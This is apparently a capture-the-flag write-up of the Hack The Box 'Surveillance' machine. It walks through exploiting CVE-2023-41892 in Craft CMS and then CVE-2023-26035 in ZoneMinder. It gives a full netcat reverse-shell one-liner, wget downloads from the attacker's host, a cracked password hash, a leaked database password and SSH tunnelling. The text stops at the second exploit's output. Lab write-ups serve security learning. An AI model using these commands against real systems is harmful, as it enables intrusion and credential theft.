+<p>CVE-2023-41892 is a security vulnerability discovered in Craft CMS, a popular content management system. Craft CMS versions affected by this vulnerability allow attackers to execute arbitrary code remotely, potentially compromising the security and integrity of the application.</p>
+<p>We are also given a python exploit and we can try that. So running the script with the URL gives us a shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ python3 poc.py                                                                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Usage: python CVE-2023-41892.py &lt;url&gt; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ python3 poc.py http://surveillance.htb/ 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Get temporary folder and document root ... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Write payload to temporary file ... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Trigger imagick to write shell ... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Done, enjoy the shell 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ id 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ whoami 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>www-data 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$  
+</span></span></code></pre></div><p>So now I figured we cannot really do anything here so we might need a stable shell, and that can be made possible by sending a reverse shell and firing up a listener to get back a connection. One could use this one liner.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 10.10.14.35 <span style="color:#ae81ff">9001</span> &gt;/tmp/f 
+</span></span></code></pre></div><p>We can then start up a listener on another terminal and get this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ nc -lnvp <span style="color:#ae81ff">9001</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.35<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.245<span style="color:#f92672">]</span> <span style="color:#ae81ff">55234</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1111<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash: no job control in this shell 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>www-data@surveillance:~/html/craft/web/cpresources$  
+</span></span></code></pre></div><p>In the home directory we can see we have two users, matthew and zoneminder but it seems we don&rsquo;t have permissions here.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@surveillance:/home$ ls -la    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls -la 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root       root       <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">17</span> 11:20 . 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root       root       <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">9</span> 13:19 .. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>drwxrwx---  <span style="color:#ae81ff">3</span> matthew    matthew    <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">9</span> 12:45 matthew 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>drwxr-x---  <span style="color:#ae81ff">2</span> zoneminder zoneminder <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">9</span> 12:46 zoneminder 
+</span></span></code></pre></div><p>We can then go through the files in here and after some time we could come across this zip file, now the zip file is interesting since it could hold some information like credentials from the database.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@surveillance:~/html/craft/storage/backups$ ls 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>surveillance--2023-10-17-202801--v4.4.14.sql.zip 
+</span></span></code></pre></div><p>First, you need to transfer the file containing your zip file to a location that is accessible by the web server. This is typically the web server&rsquo;s root directory or a directory where files are served to clients. You can use various methods to transfer the file, such as uploading it via FTP, SCP (Secure Copy), or using a file manager if you have access to a web-based file management interface. Once the file is uploaded to the web server directory, it becomes accessible via HTTP. You can then use a tool like wget on the target system to download the zip file from the web server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip surveillance--2023-10-17-202801--v4.4.14.sql.zip  
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ wget http://surveillance.htb/surveillance--2023-10-17-202801--v4.4.14.sql.zip  
+</span></span></code></pre></div><p>We can unzip this zip file and we get a file. We can go through the file searching for something interesting like some usernames or passwords, and then we come across this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>LOCK TABLES <span style="color:#e6db74">`</span>users<span style="color:#e6db74">`</span> WRITE; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/*!40000 ALTER TABLE <span style="color:#e6db74">`</span>users<span style="color:#e6db74">`</span> DISABLE KEYS */; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set autocommit<span style="color:#f92672">=</span>0; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INSERT INTO <span style="color:#e6db74">`</span>users<span style="color:#e6db74">`</span> VALUES <span style="color:#f92672">(</span>1,NULL,1,0,0,0,1,<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;Matthew B&#39;</span>,<span style="color:#e6db74">&#39;Matthew&#39;</span>,<span style="color:#e6db74">&#39;B&#39;</span>,<span style="color:#e6db74">&#39;admin@surveillance.htb&#39;</span>,<span style="color:#e6db74">&#39;39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec&#39;</span>,<span style="color:#e6db74">&#39;2023-10-17 20:22:34&#39;</span>,NULL,NULL,NULL,<span style="color:#e6db74">&#39;2023-10-11 18:58:57&#39;</span>,NULL,1,NULL,NULL,NULL,0,<span style="color:#e6db74">&#39;2023-10-17 20:27:46&#39;</span>,<span style="color:#e6db74">&#39;2023-10-11 17:57:16&#39;</span>,<span style="color:#e6db74">&#39;2023-10-17 20:27:46&#39;</span><span style="color:#f92672">)</span>; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/*!40000 ALTER TABLE <span style="color:#e6db74">`</span>users<span style="color:#e6db74">`</span> ENABLE KEYS */; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>UNLOCK TABLES; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit; 
+</span></span></code></pre></div><p>Well, it looks like we might have found a hash right next to matthew and using hash-identifier we can see possible hashes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ hash-identifier 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">######################################################################### </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#     __  __                     __           ______    _____           # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                             By Zion3R # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                    www.Blackploit.com # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                   Root@Blackploit.com # </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">######################################################################### </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------- 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Possible Hashs: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-256 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-256 
+</span></span></code></pre></div><p>We can then use hashcat to try and decode the hash or something</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>- <span style="color:#f92672">[</span> Hash modes <span style="color:#f92672">]</span> - 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># | Name                                                       | Category </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">======</span>+<span style="color:#f92672">============================================================</span>+<span style="color:#f92672">======================================</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">900</span> | MD4                                                        | Raw Hash 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span> | MD5                                                        | Raw Hash 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">100</span> | SHA1                                                       | Raw Hash 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1300</span> | SHA2-224                                                   | Raw Hash 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1400</span> | SHA2-256                                                   | Raw Hash 
+</span></span></code></pre></div><p>Hashcat may not work for some but we have another option called crackstation, which is super fast. Other tools like John the ripper can also be used.</p>
+<p>Now we have mathew&rsquo;s password so now we can ssh into the machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ ssh matthew@10.10.11.245 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.11.245 (10.10.11.245)&#39;</span> can<span style="color:#e6db74">&#39;t be established. 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE. 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names. 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.11.245<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts. 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">matthew@10.10.11.245&#39;</span>s password:  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.15.0-89-generic x86_64<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Documentation:  https://help.ubuntu.com 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Management:     https://landscape.canonical.com 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Support:        https://ubuntu.com/advantage 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Thu Feb <span style="color:#ae81ff">22</span> 10:10:13 AM UTC <span style="color:#ae81ff">2024</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:  0.0               Processes:             <span style="color:#ae81ff">225</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Usage of /:   83.9% of 5.91GB   Users logged in:       <span style="color:#ae81ff">0</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Memory usage: 12%               IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.10.11.245 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Swap usage:   0% 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Expanded Security Maintenance <span style="color:#66d9ef">for</span> Applications is not enabled. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enable ESM Apps to receive additional future security updates. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>See https://ubuntu.com/esm or run: sudo pro status 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Tue Dec  <span style="color:#ae81ff">5</span> 12:43:54 <span style="color:#ae81ff">2023</span> from 10.10.14.40 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>matthew@surveillance:~$  
+</span></span></code></pre></div><p>Checking whether a user can run any sudo commands involves inspecting the sudo configuration (sudoers file) and determining which privileges have been granted to the user. Well we can do this using sudo –l. But we immediately realize that the user matthew cannot run sudo on the machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matthew@surveillance:~$ sudo -l  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> matthew:  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Sorry, user matthew may not run sudo on surveillance. 
+</span></span></code></pre></div><p>So I opt to sending linpeas to the machine and let it enumerate further</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matthew@surveillance:~$ wget http://10.10.14.35:8090/linpeas.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--2024-02-22 10:17:13--  http://10.10.14.35:8090/linpeas.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Connecting to 10.10.14.35:8090... connected. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">853290</span> <span style="color:#f92672">(</span>833K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-sh<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Saving to: ‘linpeas.sh’ 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>linpeas.sh                              100%<span style="color:#f92672">[============================================================================</span>&gt;<span style="color:#f92672">]</span> 833.29K   848KB/s    in 1.0s     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2024-02-22 10:17:16 <span style="color:#f92672">(</span><span style="color:#ae81ff">848</span> KB/s<span style="color:#f92672">)</span> - ‘linpeas.sh’ saved <span style="color:#f92672">[</span>853290/853290<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>matthew@surveillance:~$ ls 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>linpeas.sh  user.txt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>matthew@surveillance:~$ chmod +x linpeas.sh 
+</span></span></code></pre></div><p><img src="https://i.ibb.co/PxBSdcK/db-passwords.png" alt="database_username_pass">
+Here linpeas is able to find a database username and and a database password, that may be interesting.</p>
+<p><img src="https://i.ibb.co/rs1Z3WB/zoneminder-password.png" alt="zoneminder_pass">
+Here linpeas is able to find the password ‘ZoneMinderPassword2023’, this could be the database password, and could be worth noting that down.
+<img src="https://i.ibb.co/0jByxY7/zoneminder-config.png" alt="zoneminder_config">
+Linpeas is also able to find some configuration files of the database, we see that it is hosted locally (127.0.0.1) and is on port 8080.  We can then do a google search just to see what zonmidner is. <a href="https://zoneminder.com/">https://zoneminder.com/</a>. We find out that zoneminder is a monitoring software.</p>
+<p>Since we have access to a system within the local network, we can potentially use it as a pivot point for port forwarding, also known as port tunneling or SSH tunneling, to access services that are not directly accessible from outside the network.</p>
+<p>Here&rsquo;s how port forwarding works:</p>
+<pre><code>Set up an SSH Connection: First, you need to establish an SSH connection to a system within the local network that has access to the service you want to reach.  
+
+Configure Port Forwarding: While setting up the SSH connection, you can configure port forwarding by specifying the -L option followed by the local port, the destination address (usually localhost), and the destination port. For example, to forward local port 8080 to port 80 on a web server within the local network: 
+
+Access the Service: Once the SSH connection is established with port forwarding configured, you can access the service by connecting to localhost on the specified local port. For example, to access the web server, you would navigate to http://localhost:8080 in your web browser. 
+</code></pre>
+<p>Port forwarding allows you to securely access services within the local network without directly exposing them to the internet. It can be particularly useful for accessing services on systems behind firewalls or NAT (Network Address Translation) devices.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance$ ssh -L 2222:127.0.0.1:8080 matthew@surveillance.htb 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;surveillance.htb (10.10.11.245)&#39;</span> can<span style="color:#e6db74">&#39;t be established. 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE. 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:15: [hashed name] 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>surveillance.htb<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts. 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">matthew@surveillance.htb&#39;</span>s password:  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.15.0-89-generic x86_64<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Documentation:  https://help.ubuntu.com 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Management:     https://landscape.canonical.com 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Support:        https://ubuntu.com/advantage 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Thu Feb <span style="color:#ae81ff">22</span> 10:28:17 AM UTC <span style="color:#ae81ff">2024</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:  0.0               Processes:             <span style="color:#ae81ff">229</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Usage of /:   84.5% of 5.91GB   Users logged in:       <span style="color:#ae81ff">0</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Memory usage: 19%               IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.10.11.245 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Swap usage:   0% 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Expanded Security Maintenance <span style="color:#66d9ef">for</span> Applications is not enabled. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enable ESM Apps to receive additional future security updates. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>See https://ubuntu.com/esm or run: sudo pro status 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Thu Feb <span style="color:#ae81ff">22</span> 10:10:14 <span style="color:#ae81ff">2024</span> from 10.10.14.35 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>matthew@surveillance:~$ ls 
+</span></span></code></pre></div><p>Now we can try to access the site we get a login page there
+<img src="https://i.ibb.co/z2nyRbn/zoneminder-login-page.png" alt="zoneminder_login"></p>
+<p>We can also check the config files. Configuration files often contain valuable information about the system setup and can sometimes reveal clues or misconfigurations that could lead to vulnerabilities or alternative access methods. Common locations for configuration files include /etc and directories within the application&rsquo;s installation directory. Look for files like config.php, config.ini, or similar, depending on the application.
+<img src="https://i.ibb.co/zb7pZcr/zoneminder-version.png" alt="zoneminder_config"></p>
+<p>We might do a google search on reported vulnerabilities concerning zoneminder and we do come across a GitHub repository that contains an exploit for a vulnerability identified as CVE-2023-26035, which enables remote code execution (RCE). Remote code execution vulnerabilities are severe security issues that allow an attacker to execute arbitrary code on a target system remotely, often leading to complete compromise of the system.</p>
+<p><a href="https://github.com/rvizx/CVE-2023-26035">exploit</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance/CVE-2023-26035$ python3 exploit.py -t http://127.0.0.1:2222 -ip 10.10.14.35 -p <span style="color:#ae81ff">4444</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> fetching csrt token 
+</span></span><span style="display:flex;"><span>
